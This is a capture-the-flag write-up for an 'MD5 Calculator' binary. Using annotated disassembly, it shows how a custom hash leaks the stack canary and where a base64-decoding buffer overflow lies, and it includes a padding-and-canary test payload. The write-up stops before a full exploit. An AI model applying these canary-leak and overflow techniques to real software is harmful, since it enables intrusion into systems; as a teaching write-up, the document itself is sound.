# MD5 Calcualator

## Binary inspection
- 32 bit elf
- Dynamically allocated
- NX enabled
- Stack checking enabled


Note: In order to fully understand this solution you need to learn
about stack canaries.


## What the binary does

The binary asks for completing a captcha challange by entering a number (which is printed).
Then it asks for base64 encoded data to hash. It prints the hash and exists.

```
> ./hash
- Welcome to the free MD5 calculating service -
Are you human? input captcha : -67155330
-67155330
Welcome! you are authenticated.
Encode your data with BASE64 then paste me!
asdhasdh 
MD5(data) : faea518e8de370adcdb41ff805e438e1
Thank you for using our service.
```


## Inspecting the disassembled code

An exploit is most probable to be in my_hash which sound very fishy. 
The main function calls only few functions, most of them are from the standard library 
or from openssl. but my_hash seems very suspicious since nobody implements their own
hashes nowadays.

## Looking into my_hash

```
08048ed8 55              PUSH       EBP
08048ed9 89 e5           MOV        EBP,ESP
08048edb 53              PUSH       EBX
08048edc 83 ec 34        SUB        ESP,0x34
08048edf 65 a1 14        MOV        EAX,GS:[0x14]
            00 00 00
08048ee5 89 45 f4        MOV        dword ptr [EBP + local_10],EAX

; ---- snip ----

08048f7b 8b 55 f4        MOV        EDX,dword ptr [EBP + local_10]
08048f7e 65 33 15        XOR        EDX,dword ptr GS:[0x14]
            14 00 00 00
08048f85 74 05           JZ         LAB_08048f8c
08048f87 e8 04 fa        CALL       __stack_chk_fail                                 undefined __stack_chk_fail()
            ff ff

```

**Note**: The decompiler is lying. The address of the canary is at `[ebp - 0xc]` and not `[ebp - 0x10]`

The stack is protected by using stack canary, which means even if stack buffer overflow is found, 
we will still need a way to bypass the canary somehow.

I decided to take a closer look in the logic inside this function:

``` Assembly
; Initialize the variables.
; Note that ebp - 0x2c is put inside [ebp-0x34]
0x8048eea <my_hash+18>          lea    eax,[ebp-0x2c]             
0x8048eed <my_hash+21>          mov    DWORD PTR [ebp-0x34],eax   
0x8048ef0 <my_hash+24>          mov    DWORD PTR [ebp-0x30],0x0   
0x8048ef7 <my_hash+31>          mov    DWORD PTR [ebp-0x38],0x0   

; Start a loop - equivelent to for i in range(8), when i is [ebp-0x38].
0x8048efe <my_hash+38>          jmp    0x8048f16 <my_hash+62>     

; Multiply the counter by 4
0x8048f00 <my_hash+40>          mov    eax,DWORD PTR [ebp-0x38]
0x8048f03 <my_hash+43>          shl    eax,0x2                    

; Add the counter to [ebp-0x34] which actually holds the value: ebp - 0x2c
0x8048f06 <my_hash+46>          mov    ebx,eax                    
0x8048f08 <my_hash+48>          add    ebx,DWORD PTR [ebp-0x34]   

; call rand() and put the result random number inside ebx
0x8048f0b <my_hash+51>          call   0x80489e0 <rand@plt>       
0x8048f10 <my_hash+56>          mov    DWORD PTR [ebx],eax        
0x8048f12 <my_hash+58>          add    DWORD PTR [ebp-0x38],0x1   

; Finish the loop if the counter reached to 7
0x8048f16 <my_hash+62>          cmp    DWORD PTR [ebp-0x38],0x7   
0x8048f1a <my_hash+66>          jle    0x8048f00 <my_hash+40>     
```

This part of the function puts random number in multiple addresses in the stack.
Here are the addresses:

```python
In [10]: ebp = 0

In [11]: for i in range(8):
    ...:     address = (i << 2) + ebp - 0x2c
    ...:     print(f'address: $ebp + {hex(address)}')
    ...: 
address: $ebp + -0x2c
address: $ebp + -0x28
address: $ebp + -0x24
address: $ebp + -0x20
address: $ebp + -0x1c
address: $ebp + -0x18
address: $ebp + -0x14
address: $ebp + -0x10
```


```
; [ebp - 0x30] = [ebp - 0x2c + 4] + [ebp - 0x2c + 0x14]
0x8048f1c <my_hash+68>  mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f1f <my_hash+71>  add    eax,0x4
0x8048f22 <my_hash+74>  mov    edx,DWORD PTR [eax]                             
0x8048f24 <my_hash+76>  mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f27 <my_hash+79>  add    eax,0x14                                        
0x8048f2a <my_hash+82>  mov    eax,DWORD PTR [eax]                             
0x8048f2c <my_hash+84>  add    eax,edx                                         
0x8048f2e <my_hash+86>  add    DWORD PTR [ebp-0x30],eax                        

; [ebp - 0x30] += [ebp - 0x2c + 8] - [ebp - 0x2c + 0xc]
0x8048f31 <my_hash+89>  mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f34 <my_hash+92>  add    eax,0x8                                         
0x8048f37 <my_hash+95>  mov    edx,DWORD PTR [eax]                             
0x8048f39 <my_hash+97>  mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f3c <my_hash+100> add    eax,0xc                                         
0x8048f3f <my_hash+103> mov    eax,DWORD PTR [eax]                             
0x8048f41 <my_hash+105> mov    ecx,edx                                         
0x8048f43 <my_hash+107> sub    ecx,eax                                         
0x8048f45 <my_hash+109> mov    eax,ecx                                         
0x8048f47 <my_hash+111> add    DWORD PTR [ebp-0x30],eax          

; [ebp - 0x30] += [ebp - 0x2c + 0x1c] + [ebp - 0x2c + 0x20 (the canary)]
0x8048f4a <my_hash+114> mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f4d <my_hash+117> add    eax,0x1c                                        
0x8048f50 <my_hash+120> mov    edx,DWORD PTR [eax]                             
0x8048f52 <my_hash+122> mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f55 <my_hash+125> add    eax,0x20                                        
0x8048f58 <my_hash+128> mov    eax,DWORD PTR [eax]                             
0x8048f5a <my_hash+130> add    eax,edx                                         
0x8048f5c <my_hash+132> add    DWORD PTR [ebp-0x30],eax 

; [ebp - 0x30] += [ebp - 0x1c + 0x10] - [ebp - 0x1c - 0x18]
0x8048f5f <my_hash+135> mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f62 <my_hash+138> add    eax,0x10                                        
0x8048f65 <my_hash+141> mov    edx,DWORD PTR [eax]                             
0x8048f67 <my_hash+143> mov    eax,DWORD PTR [ebp-0x34]                        
0x8048f6a <my_hash+146> add    eax,0x18                                        
0x8048f6d <my_hash+149> mov    eax,DWORD PTR [eax]                     
0x8048f6f <my_hash+151> mov    ecx,edx                                 
0x8048f71 <my_hash+153> sub    ecx,eax                                 
0x8048f73 <my_hash+155> mov    eax,ecx                                 
0x8048f75 <my_hash+157> add    DWORD PTR [ebp-0x30],eax                

0x8048f78 <my_hash+160> mov    eax,DWORD PTR [ebp-0x30]                
0x8048f7b <my_hash+163> mov    edx,DWORD PTR [ebp-0xc]                 
0x8048f7e <my_hash+166> xor    edx,DWORD PTR gs:0x14                   
0x8048f85 <my_hash+173> je     0x8048f8c <my_hash+180>                 
0x8048f87 <my_hash+175> call   0x8048990 <__stack_chk_fail@plt>        
0x8048f8c <my_hash+180> add    esp,0x34                                
0x8048f8f <my_hash+183> pop    ebx                                     
0x8048f90 <my_hash+184> pop    ebp                                     
```

What happens in the code above is very interesting. 
The binary generates 8 random numbers and stores them on the stack.
Then it takes 8 numbers from the stack and perform some calculation. The vulnerability
is that the calculation is composed of all numbers from the 2nd generated number, 
and the **canary**.

Instead of performing the calculation with the following addresses: 
```
ebp-0x2c, ebp-0x28, ebp-0x24, ebp-0x20, ebp-0x1c, ebp-0x18, ebp-0x14, ebp-0x10
```

It works with these addresses:

```
ebp-0x28, ebp-0x24, ebp-0x20, ebp-0x1c, ebp-0x18, ebp-0x14, ebp-0x10, ebp-0xc
```

If we reverse engineer this piece of code, we can find that the calculation is:

```C
int result = 0;
result += generated_numbers[1] + generated_numbers[5]
result += generated_numbers[2] - generated_numbers[3]
result += generated_numbers[7] + canary
result += generated_numbers[4] - generated_numbers[6]
```

This is a vulnerability since in `ebp-0xc` the canary is stored. Therefore we can calculate it
by using the captcha value.


At this point we know for sure that if we have a buffer overlflow, we will be able to exploit it since
we can discover the stack canary for the process.


## Finding a buffer overflow

I Found a buffer overflow in `process_hash` function, which takes care of decoding the base64 
input from the user, and passing it into another function named `calc_md5`.

A buffer overflow occures when the program attempts to decode the

Here is the vulnerable code:

```
0x8048f97 <process_hash+5>      sub    esp,0x220  

; --------- snip -----------

0x8048fe5 <process_hash+83>     mov    DWORD PTR [esp+0x8],eax
0x8048fe9 <process_hash+87>     mov    DWORD PTR [esp+0x4],0x400
0x8048ff1 <process_hash+95>     mov    DWORD PTR [esp],0x804b0e0
0x8048ff8 <process_hash+102>    call   0x80488a0 <fgets@plt>

; --------- snip -----------
0x8049015 <process_hash+131>    lea    eax,[ebp-0x20c] 
0x804901b <process_hash+137>    mov    DWORD PTR [esp+0x4],eax
0x804901f <process_hash+141>    mov    DWORD PTR [esp],0x804b0e0
0x8049026 <process_hash+148>    call   0x8048cd5 <Base64Decode>
```

`0x804b0e0` - 0x400 bytes buffer on the data section which contains the encoded base64 value from the user.


- `process_hash` function statically alocates 0x220 bytes
- reads up to 0x400 bytes of base64 input from the user 
- decodes the input and puts it on the stack (at `ebp - 0x20c`)

Since base64 encoded output is about 4/3 greater than it's input, we have about 
540 (`0x20C - 4`) bytes to overflow :).


## The stack

```
       Return Address    => ebp + 4
    -------------------
        previous EBP     => ebp
    -------------------
            ....     
    -------------------
           Canary        => ebp - 0xc
    -------------------
            .... 
    -------------------
           Buffer        => ebp - 0x20c

```

In gdb, the ebp equals: `0xffffd168`

## Overriding the canaary 

The following payload will write a buffer with AAAA to the stack and BBBB to the canary.

```python
In [51]: payload = b'A' * 0x200 + b'BBBB'

In [52]: print(base64_encode(payload)[0].decode().replace('\n', ''))
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQkJC
```

By using a C program of our own (see calculate_hash/calculate_hash.c) that simulates the behavior of the custom hash function, we can
calculate the actual canary, and write everything we'd like to the stack :).



